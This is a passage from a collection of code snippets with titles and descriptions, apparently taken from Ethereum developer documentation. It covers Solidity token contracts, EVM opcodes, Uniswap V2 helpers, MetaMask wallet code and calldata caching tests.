more than one byte, validating the functionality for larger cache sizes.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Test encodeVal when the key is more than a single byte\n    // Maximum three bytes because filling the cache to four bytes takes\n    // too long.\n    function testEncodeValBig() public {\n        // Put a number of values in the cache.\n        // To keep things simple, use key n for value n.\n        for(uint i=1; i<0x1FFF; i++) {\n            cache.cacheWrite(i);\n        }\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(0x000F),   // One byte        0x0F\n            cache.encodeVal(0x0010),   // Two bytes     0x1010\n            cache.encodeVal(0x0100),   // Two bytes     0x1100\n            cache.encodeVal(0x1000)    // Three bytes 0x201000\n        );\n        .\n        .\n        .\n        .\n    }    // testEncodeValBig\n\n\n\n```\n\n----------------------------------------\n\nTITLE: Defining Balance Mapping for ERC-20\nDESCRIPTION: Declares a private mapping to track token balances for each address. This state variable stores how many tokens each address owns.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping (address => uint256) private _balances;\n```\n\n----------------------------------------\n\nTITLE: Unique Token Validation Modifier in Solidity\nDESCRIPTION: A modifier that checks if a Pizza token with given name and DNA is unique. It iterates through existing pizzas, comparing name hashes and DNA values, and requires that no duplicate exists.\n\nLANGUAGE: Solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Byzantium EIPs in an Expandable Card Component\nDESCRIPTION: A React component that displays Byzantium Ethereum Improvement Proposals (EIPs) in an expandable card format. The component lists nine EIPs that were included in the Byzantium fork with their descriptions and links.\n\nLANGUAGE: jsx\nCODE:\n```\n<ExpandableCard title=\"Byzantium-EIPs\" contentPreview=\"Official improvements included in this fork.\">\n\n<ul>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-140\">EIP-140</a> – <em>integriert den Operationscode <code>REVERT</code>.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-658\">EIP-658</a> – <em>Statusfeld zu Transaktionsbelegen hinzugefügt, Erfolg oder Misserfolg anzuzeigen.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-196\">EIP-196</a> – <em>integriert die elliptische Kurve sowie die Multiplikation mit einem Skalar, die die Verwendung von <a href=\"/developers/docs/scaling/zk-rollups/\">ZK-Snarks </a></em> ermöglichen.</li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-197\">EIP-197</a> – <em>fügt elliptische Kurven und Skalarmultiplikation hinzu, um <a href=\"/developers/docs/scaling/zk-rollups/\">ZK-Snarks</a> zu ermöglichen.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-198\">EIP-198</a> – <em>aktiviert Überprüfung der RSA-Signatur.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-211\">EIP-211</a> – <em>fügt Unterstützung der Ausgabewerte eines Variableninhalts hinzu.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-214\">EIP-214</a> – <em>integriert den Verfahrenscode, <code>STATICCALL</code> der nicht zustandsveränderte Aufrufe für andere Verträge erlaubt.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-100\">EIP-100</a> – <em>ändert die Formel für die Einstellung des Schwierigkeitsgrades.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-649\">EIP-649</a> – <em>verzögert die <a href=\"/glossary/#difficulty-bomb\"> Schwierigkeitsbombe</a> um ein Jahr und senkt die vollen Blockprämien von 5 auf 3 ETH.</em></li>\n</ul>\n\n</ExpandableCard>\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Approve Function in Solidity\nDESCRIPTION: Implements the approve function for ERC20 tokens that allows the caller to set an allowance for a spender address. Similar to transfer, it returns true on success or reverts on failure.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-approve}.\n *\n * Persyaratan:\n *\n * - `pembelanja` tidak dapat berupa alamat kosong.\n */\nfunction approve(address spender, uint256 amount) public virtual override returns (bool) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n    _approve(_msgSender(), spender, amount);\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: REVERT Opcode in EVM\nDESCRIPTION: Reverts the current execution, returning specified memory data as the error reason while refunding remaining gas.\n\nLANGUAGE: evm assembly\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Pair Initialization in Uniswap V2\nDESCRIPTION: Allows only the factory to initialize the pair by setting the token addresses, ensuring proper setup of the exchange pair.\n\nLANGUAGE: solidity\nCODE:\n```\n// called once by the factory at time of deployment\nfunction initialize(address _token0, address _token1) external {\n    require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n    token0 = _token0;\n    token1 = _token1;\n}\n```\n\n----------------------------------------\n\nTITLE: Token Address Parameters for ERC20DepositInitiated Event\nDESCRIPTION: Defines token address parameters for the ERC20DepositInitiated event. These parameters specify the L1 and L2 token addresses involved in the bridge transaction.\n\nLANGUAGE: solidity\nCODE:\n```\n        address indexed _l1Token,\n        address indexed _l2Token,\n```\n\n----------------------------------------\n\nTITLE: Implementing Core Functions for NFT Minter Application\nDESCRIPTION: Three async function stubs that will handle MetaMask wallet connection and NFT minting operations. useEffect will initialize wallet listener, connectWalletPressed connects the user's wallet, and onMintPressed handles the NFT minting process.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onMintPressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Average Gas Limit per Day in Ethereum Blocks\nDESCRIPTION: SQL query that extracts the daily average gas limit from Ethereum blocks, which represents the supply of available block space. The query groups data by day and calculates the average gas limit.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_limit) AS avg_block_gas_limit\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Implementing Core Functions for NFT Minter Application\nDESCRIPTION: Three async function stubs that will handle MetaMask wallet connection and NFT minting operations. useEffect will initialize wallet listener, connectWalletPressed connects the user's wallet, and onMintPressed handles the NFT minting process.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onMintPressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Total Supply of Shares in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the total number of unredeemed vault shares in circulation.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalSupply() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Implementing Mint and Burn Functions in L2StandardERC20\nDESCRIPTION: Implements the mint and burn functions that only the L2 bridge can call, ensuring proper token supply management with appropriate event emissions.\n\nLANGUAGE: solidity\nCODE:\n```\n    // slither-disable-next-line external-function\n    function mint(address _to, uint256 _amount) public virtual onlyL2Bridge {\n        _mint(_to, _amount);\n\n        emit Mint(_to, _amount);\n    }\n\n    // slither-disable-next-line external-function\n    function burn(address _from, uint256 _amount) public virtual onlyL2Bridge {\n        _burn(_from, _amount);\n\n        emit Burn(_from, _amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Summary Command for Gas Consumption Testing\nDESCRIPTION: Final example showing the basic command and configuration needed to run gas consumption analysis with Echidna on any contract.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test contract.sol --config config.yaml\n...\n```\n\n----------------------------------------\n\nTITLE: Setting Approval and Emitting Approval Event in Vyper\nDESCRIPTION: This code sets the approved address for a specific token and emits the Approval event as required by the ERC-721 standard, including the owner, approved address, and token ID.\n\nLANGUAGE: python\nCODE:\n```\n    # Set the approval\n    self.idToApprovals[_tokenId] = _approved\n    log Approval(owner, _approved, _tokenId)\n\n\n@external\ndef setApprovalForAll(_operator: address, _approved: bool):\n    \"\"\"\n    @dev Enables or disables approval for a third party (\"operator\") to manage all of\n         `msg.sender`'s assets. It also emits the ApprovalForAll event.\n         Throws if `_operator` is the `msg.sender`. (NOTE: This is not written the EIP)\n    @notice This works even if sender doesn't own any tokens at the time.\n    @param _operator Address to add to the set of authorized operators.\n    @param _approved True if the operators is approved, false to revoke approval.\n    \"\"\"\n    # Throws if `_operator` is the `msg.sender`\n    assert _operator != msg.sender\n    self.ownerToOperators[msg.sender][_operator] = _approved\n    log ApprovalForAll(msg.sender, _operator, _approved)\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Tracking in Solidity\nDESCRIPTION: A mapping that tracks which addresses are frozen in the smart contract. By default, all accounts are initialized to false (not frozen).\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => bool) public frozenAccounts;\n```\n\n----------------------------------------\n\nTITLE: Testing Calldata Interpreter with JavaScript\nDESCRIPTION: JavaScript test that demonstrates how to use the Calldata Interpreter contract, including deploying the contracts, calling the faucet function, and transferring tokens using compressed calldata.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { expect } = require(\"chai\");\n\ndescribe(\"CalldataInterpreter\", function () {\n  it(\"Should let us use tokens\", async function () {\n    const Token = await ethers.getContractFactory(\"OrisUselessToken\")\n    const token = await Token.deploy()\n    await token.deployed()\n    console.log(\"Token addr:\", token.address)\n\n    const Cdi = await ethers.getContractFactory(\"CalldataInterpreter\")\n    const cdi = await Cdi.deploy(token.address)\n    await cdi.deployed()\n    console.log(\"CalldataInterpreter addr:\", cdi.address)\n\n    const signer = await ethers.getSigner()\n\n    // Get tokens to play with\n    const faucetTx = {\n      to: cdi.address,\n      data: \"0x01\"\n\n    }\n    await (await signer.sendTransaction(faucetTx)).wait()\n\n// Check the faucet provides the tokens correctly\nexpect(await token.balanceOf(signer.address)).to.equal(1000)\n\n// Give the CDI an allowance (approvals cannot be proxied)\nconst approveTX = await token.approve(cdi.address, 10000)\nawait approveTX.wait()\nexpect(await token.allowance(signer.address, cdi.address)).to.equal(10000)\n\n// Transfer tokens\nconst destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\nconst transferTx = {\n  to: cdi.address,\n  data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n}\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe Token Approval in TransferHelper\nDESCRIPTION: Helper function for safely approving ERC20 token transfers that handles both revert cases and false returns consistently. It uses low-level calls with ABI encoding to interact with token contracts.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: GPL-3.0-or-later\n\npragma solidity >=0.6.0;\n\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\nlibrary TransferHelper {\n    function safeApprove(\n        address token,\n        address to,\n        uint256 value\n    ) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeApprove: approve failed'\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Testing Token Transfer with Controlled Destination Contract\nDESCRIPTION: JavaScript code demonstrating how to execute a token transfer when the destination contract is controlled, eliminating the need for an allowance since the proxy is trusted by the token contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// Transfer tokens\nconst destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\nconst transferTx = {\n  to: cdi.address,\n  data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n}\nawait (await signer.sendTransaction(transferTx)).wait()\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH/USD Price Feed using Chainlink in Solidity\nDESCRIPTION: This snippet demonstrates how to create a smart contract that fetches the latest ETH/USD price using Chainlink's price feed oracle. It imports the AggregatorV3Interface from Chainlink's contracts and implements a function to retrieve the latest price data from a specific aggregator address on the Kovan network.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.7;\n\nimport \"@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol\";\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    /**\n     * Network: Kovan\n     * Aggregator: ETH/USD\n     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331\n     */\n    constructor() public {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    /**\n     * Returns the latest price\n     */\n    function getLatestPrice() public view returns (int) {\n        (\n            uint80 roundID,\n            int price,\n            uint startedAt,\n            uint timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        return price;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Minting Shares in ERC-4626 Vault\nDESCRIPTION: This method mints a specified amount of shares to the receiver by depositing the corresponding amount of underlying tokens into the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(uint256 shares, address receiver) public returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Defining Parameter Constants for Dagger-Hashimoto Mining Algorithm\nDESCRIPTION: Configuration parameters for the Dagger-Hashimoto algorithm, including dataset size, cache size, difficulty, epoch time, and other critical values that control the algorithm's behavior and memory requirements.\n\nLANGUAGE: python\nCODE:\n```\nSAFE_PRIME_512 = 2**512 - 38117     # Largest Safe Prime less than 2**512\n\nparams = {\n      \"n\": 4000055296 * 8 // NUM_BITS,  # Size of the dataset (4 Gigabytes); MUST BE MULTIPLE OF 65536\n      \"n_inc\": 65536,                   # Increment in value of n per period; MUST BE MULTIPLE OF 65536\n                                        # with epochtime=20000 gives 882 MB growth per year\n      \"cache_size\": 2500,               # Size of the light client's cache (can be chosen by light\n                                        # client; not part of the algo spec)\n      \"diff\": 2**14,                    # Difficulty (adjusted during block evaluation)\n      \"epochtime\": 100000,              # Length of an epoch in blocks (how often the dataset is updated)\n      \"k\": 1,                           # Number of parents of a node\n      \"w\": w,                          # Used for modular exponentiation hashing\n      \"accesses\": 200,                  # Number of dataset accesses during hashimoto\n      \"P\": SAFE_PRIME_512               # Safe Prime for hashing and random number generation\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Shares to Assets in ERC-4626 Vault\nDESCRIPTION: The convertToAssets function calculates how many underlying assets would be received in exchange for a specified amount of vault shares.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToAssets(uint256 shares) public view returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Consensus-Execution Client Interaction Flow (Block Producer)\nDESCRIPTION: This flowchart illustrates the interaction between consensus and execution clients when the consensus client is selected as the block producer. It shows how transactions are collected, bundled into blocks, and propagated through the network.\n\nLANGUAGE: markdown\nCODE:\n```\n### When consensus client is block producer: {#when-consensus-client-is-block-producer}\n\n- Consensus client receives notice that it is the next block producer (consensus p2p)\n- Consensus layer calls `create block` method in execution client (local RPC)\n- Execution layer accesses the transaction mempool which has been populated by the transaction gossip protocol (execution p2p)\n- Execution client bundles transactions into a block, executes the transactions and generates a block hash\n- Consensus client grabs the transactions and block hash from the execution client and adds them to the beacon block (local RPC)\n- Consensus client broadcasts the block over the block gossip protocol (consensus p2p)\n- Other clients receive the proposed block via the block gossip protocol and validate as described above (consensus p2p)\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_accounts en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir une liste d'adresses appartenant au client en utilisant la méthode eth_accounts.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_accounts\",\"params\":[],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": [\"0x407d73d8a49eeb85d32cf465507dd71d507100c1\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Encoding Medium-Sized Cache Keys in Solidity\nDESCRIPTION: Method for encoding cache keys that fit in two bytes by using bit manipulation to include size information in the encoding.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Two byte value, encoded as 0x1vvv\n        if (_key < 0x1000)\n            return bytes.concat(bytes2(uint16(_key) | 0x1000));\n```\n\n----------------------------------------\n\nTITLE: Testing Connection to Ethereum Node in Web3.py\nDESCRIPTION: Simple connectivity check to verify that Web3.py is properly connected to an Ethereum node (or simulated node). Returns True if connected successfully.\n\nLANGUAGE: python\nCODE:\n```\nw3.is_connected()\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Contract Storage System in Serpent\nDESCRIPTION: A basic Serpent code snippet that demonstrates conditional data storage in Ethereum smart contracts. The code checks if a storage location is empty before storing a value at that location.\n\nLANGUAGE: python\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: Examining Block Structure in Ethereum with JSON\nDESCRIPTION: A JSON representation of an Ethereum block, showing its structure with metadata and a placeholder for transactions. The block includes a number, hash, parentHash, and a list of transactions.\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"number\": 1234567,\n   \"hash\": \"0xabc123...\",\n   \"parentHash\": \"0xdef456...\",\n   ...,\n   \"transactions\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing getCurrentWalletConnected Function for Persistent Connections\nDESCRIPTION: This function checks if a wallet is already connected to the dApp without prompting the user. It uses the eth_accounts method instead of eth_requestAccounts to retrieve any existing connections.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: EQ Opcode (Equality) in EVM\nDESCRIPTION: The EQ opcode compares two values for equality. It takes two int256 or uint256 values from the stack and returns 1 if they are equal or 0 if they are not equal.\n\nLANGUAGE: evm-assembly\nCODE:\n```\na == b\n```\n\n----------------------------------------\n\nTITLE: Running JavaScript Script with Hardhat\nDESCRIPTION: Command to execute the interaction script using Hardhat's runtime environment, which provides access to the Ethereum network and contract artifacts.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/interact.js\n```\n\n----------------------------------------\n\nTITLE: Defining IL2StandardERC20 Interface for L2 Bridge-Compatible Tokens\nDESCRIPTION: Defines the interface required for ERC-20 tokens on L2 to work with the standard bridge, extending standard ERC-20 and ERC-165 interfaces with bridge-specific functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Call Data Operations in EVM\nDESCRIPTION: Operations for accessing and manipulating message call data in the Ethereum Virtual Machine, including reading data at specific indices, retrieving data size, and copying data to memory.\n\nLANGUAGE: evm\nCODE:\n```\n35   | CALLDATALOAD   | idx          | msg.data[idx:idx+32]             | read word from msg data at index idx\n36   | CALLDATASIZE   | .            | len(msg.data)                    | length of msg data, in bytes\n37   | CALLDATACOPY   | dstOst, ost, len | .                            | mem[dstOst:dstOst+len-1] := msg.data[ost:ost+len-1] | copy msg data\n```\n\n----------------------------------------\n\nTITLE: Implementing Wallet Listener with MetaMask in JavaScript\nDESCRIPTION: This function sets up a listener for wallet state changes with MetaMask. It updates the UI based on whether accounts are connected, handling different states such as connecting, disconnecting, or changing accounts.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: First Function Call with Cache Writing\nDESCRIPTION: Prepares the call input for testing a function with four parameters, where some parameters are written to the cache and others are not. This demonstrates the cache's selective parameter storage capability.\n\nLANGUAGE: solidity\nCODE:\n```\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            // First value, add it to the cache\n            cache.INTO_CACHE(),\n            bytes32(VAL_A)\n```\n\n----------------------------------------\n\nTITLE: Second Call Using Cache Keys\nDESCRIPTION: Prepares a second function call using cache keys instead of full values for parameters that were previously cached.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Second call, we can use the cache\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value in the Cache\n            bytes1(0x01),\n            // Second value, don't add it to the cache\n            cache.DONT_CACHE(),\n            bytes32(VAL_B),\n\n            // Third and fourth values, same value\n            bytes1(0x02),\n            bytes1(0x02)\n        );\n        .        \n        .        \n        .        \n    }   // testReadParam\n```\n\n----------------------------------------\n\nTITLE: Defining Metacoin Default State Transition Rule\nDESCRIPTION: This code snippet shows the fallback rule for metacoin protocols, where an invalid transaction returns the original state instead of an error, allowing the protocol to operate on top of Bitcoin without requiring changes to Bitcoin itself.\n\nLANGUAGE: markdown\nCODE:\n```\n`APPLY'(S,TX) = S`\n```\n\n----------------------------------------\n\nTITLE: Memory Write and Return Handler in EVM Bytecode\nDESCRIPTION: Shared code segment at offset 0xDA that writes a value to memory and prepares it for return. This helper is used by multiple getter functions to store their return value at memory position 0x80.\n\nLANGUAGE: bytecode\nCODE:\n```\nJUMPDEST\nPUSH1 0x40\nMLOAD\nSWAP1\nDUP2\nMSTORE\nPUSH1 0x20\nADD\n```\n\n----------------------------------------\n\nTITLE: Locating MicroSD Card Device Name for Flashing\nDESCRIPTION: Command to identify the device name of the MicroSD card in the system. This step is essential before flashing to ensure writing to the correct device.\n\nLANGUAGE: shell\nCODE:\n```\n# check the MicroSD card name\nsudo fdisk -l\n\n>> sdxxx\n```\n\n----------------------------------------\n\nTITLE: Setting Approval for All Tokens in Solidity\nDESCRIPTION: Function that allows an owner to approve or revoke permission for an operator to manage all their tokens. Prevents self-approval and emits an ApprovalForAll event when approval status changes.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction setApprovalForAll(address to, bool approved) public {\n    require(to != msg.sender, \"Cannot approve own address\");\n    operatorApprovals[msg.sender][to] = approved;\n    emit ApprovalForAll(msg.sender, to, approved);\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Total Assets in ERC-4626 Vault\nDESCRIPTION: This method returns the total amount of the underlying asset that is managed by the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalAssets() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Implementing Informational Banner with Call-to-Action for DAOs in HTML\nDESCRIPTION: HTML component that displays an informational banner about DAOs (Decentralized Autonomous Organizations) with a button link directing users to learn more about them.\n\nLANGUAGE: html\nCODE:\n```\n<InfoBanner shouldSpaceBetween emoji=\":eyes:\">\n  <div>Erfahren Sie mehr über DAOs</div>\n  <ButtonLink href=\"/dao/\">\n    Mehr über DAOs\n  </ButtonLink>\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: EVM Opcode Example: CODESIZE (0x38)\nDESCRIPTION: The CODESIZE opcode returns the length of the executing contract's code in bytes. It costs 2 gas and pushes a single value to the stack.\n\nLANGUAGE: solidity\nCODE:\n```\nlen(this.code)\n```\n\n----------------------------------------\n\nTITLE: ERC-223 Receiver Method Implementation in Solidity\nDESCRIPTION: The required method that must be implemented by any contract wanting to receive ERC-223 tokens. This method handles incoming token transfers and allows contracts to process or reject token deposits.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction tokenReceived(address _from, uint _value, bytes calldata _data)\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-165 supportsInterface Function in Vyper\nDESCRIPTION: View function that implements the ERC-165 standard's supportsInterface method, allowing other contracts to query which interfaces this contract supports.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef supportsInterface(_interfaceID: bytes32) -> bool:\n    \"\"\"\n    @dev Interface identification is specified in ERC-165.\n    @param _interfaceID Id of the interface\n    \"\"\"\n    return self.supportedInterfaces[_interfaceID]\n```\n\n----------------------------------------\n\nTITLE: Ethereum Virtual Machine PUSH Opcodes Reference Table\nDESCRIPTION: A comprehensive reference table documenting PUSH opcodes in the Ethereum Virtual Machine. Each entry shows the opcode in hexadecimal, operation name (PUSH11-PUSH31), gas cost (3 for all), Solidity data type correlation (uint88-uint248), and describes the functionality of pushing the specified byte-length value onto the stack.\n\nLANGUAGE: markdown\nCODE:\n```\n|  6A   | PUSH11         |                                                3                                                | `.`                                                                                       | `uint88`                        |                                                                               | push 11-byte value onto stack                                                                                                    |\n|  6B   | PUSH12         |                                                3                                                | `.`                                                                                       | `uint96`                        |                                                                               | push 12-byte value onto stack                                                                                                    |\n|  6C   | PUSH13         |                                                3                                                | `.`                                                                                       | `uint104`                       |                                                                               | push 13-byte value onto stack                                                                                                    |\n|  6D   | PUSH14         |                                                3                                                | `.`                                                                                       | `uint112`                       |                                                                               | push 14-byte value onto stack                                                                                                    |\n|  6E   | PUSH15         |                                                3                                                | `.`                                                                                       | `uint120`                       |                                                                               | push 15-byte value onto stack                                                                                                    |\n|  6F   | PUSH16         |                                                3                                                | `.`                                                                                       | `uint128`                       |                                                                               | push 16-byte value onto stack                                                                                                    |\n|  70   | PUSH17         |                                                3                                                | `.`                                                                                       | `uint136`                       |                                                                               | push 17-byte value onto stack                                                                                                    |\n|  71   | PUSH18         |                                                3                                                | `.`                                                                                       | `uint144`                       |                                                                               | push 18-byte value onto stack                                                                                                    |\n|  72   | PUSH19         |                                                3                                                | `.`                                                                                       | `uint152`                       |                                                                               | push 19-byte value onto stack                                                                                                    |\n|  73   | PUSH20         |                                                3                                                | `.`                                                                                       | `uint160`                       |                                                                               | push 20-byte value onto stack                                                                                                    |\n|  74   | PUSH21         |                                                3                                                | `.`                                                                                       | `uint168`                       |                                                                               | push 21-byte value onto stack                                                                                                    |\n|  75   | PUSH22         |                                                3                                                | `.`                                                                                       | `uint176`                       |                                                                               | push 22-byte value onto stack                                                                                                    |\n|  76   | PUSH23         |                                                3                                                | `.`                                                                                       | `uint184`                       |                                                                               | push 23-byte value onto stack                                                                                                    |\n|  77   | PUSH24         |                                                3                                                | `.`                                                                                       | `uint192`                       |                                                                               | push 24-byte value onto stack                                                                                                    |\n|  78   | PUSH25         |                                                3                                                | `.`                                                                                       | `uint200`                       |                                                                               | push 25-byte value onto stack                                                                                                    |\n|  79   | PUSH26         |                                                3                                                | `.`                                                                                       | `uint208`                       |                                                                               | push 26-byte value onto stack                                                                                                    |\n|  7A   | PUSH27         |                                                3                                                | `.`                                                                                       | `uint216`                       |                                                                               | push 27-byte value onto stack                                                                                                    |\n|  7B   | PUSH28         |                                                3                                                | `.`                                                                                       | `uint224`                       |                                                                               | push 28-byte value onto stack                                                                                                    |\n|  7C   | PUSH29         |                                                3                                                | `.`                                                                                       | `uint232`                       |                                                                               | push 29-byte value onto stack                                                                                                    |\n|  7D   | PUSH30         |                                                3                                                | `.`                                                                                       | `uint240`                       |                                                                               | push 30-byte value onto stack                                                                                                    |\n|  7E   | PUSH31         |                                                3                                                | `.`                                                                                       | `uint248`                       |                                                                               | push 31-byte value onto stack                                                                                                    |\n```\n\n----------------------------------------\n\nTITLE: Making Low-Level Call to Cache Contract\nDESCRIPTION: Executes a low-level call to the cache contract with the prepared input parameters, then verifies that the call succeeded.\n\nLANGUAGE: solidity\nCODE:\n```\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n```\n\n----------------------------------------\n\nTITLE: Executing Named Function Call with Symbolic Value\nDESCRIPTION: Example showing how to execute a specific function by name with a symbolic parameter, specifying the caller and value for the transaction.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var, caller=user_account, value=0)\n```\n\n----------------------------------------\n\nTITLE: Calculating Pair Addresses with CREATE2 in UniswapV2Library\nDESCRIPTION: Function that calculates the deterministic address for a token pair using CREATE2 without making external calls to the factory. This is more gas efficient than querying the factory contract for the pair address.\n\nLANGUAGE: solidity\nCODE:\n```\n    // calculates the CREATE2 address for a pair without making any external calls\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = address(uint(keccak256(abi.encodePacked(\n  